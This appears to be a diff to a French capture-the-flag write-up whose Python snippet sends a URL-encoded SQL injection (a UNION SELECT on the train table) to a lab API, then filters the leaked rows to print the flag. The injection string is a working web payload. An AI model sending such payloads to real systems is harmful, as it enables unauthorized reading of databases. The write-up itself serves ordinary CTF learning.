@@ -34,17 +34,19 @@ Du coup à partir de la on peut utiliser l'api pour trouver le bon train
 
 ```py
 import requests
+from icecream import ic
+
 
 URL = "http://samuel-lab.freeboxos.fr:11000/api/train?name=%27%20UNION%20SELECT%20*%20from%20train%20--%27"
 
 response = requests.get(URL)
 data = response.json()
 
-for train in data:
-    if train['track'] == '2B' and train['wagon'] == 'C4' and train['date'] == '2024-09-16' and train['hour'] == '2:00' and train['freight'] == 'OR':
-        print(train)
+for train in data["train"]:
+    if train['track'] == '2B' and train['wagon'] == 'C4' and train['date'] == '2024-09-16' and train['hour'] == '2:00' and train['freight'] == 'OR' and train['private'] == 1:
+        print(f"Flag: SNCTF{{{train['uuid']}}}")
+        break
 
-print(f"Flag: SNCTF{{{train['uuid']}}}")
 ```
 
 Il y a bien sur plusieurs moyens de trouver le bon train. Avec une full reques sql.
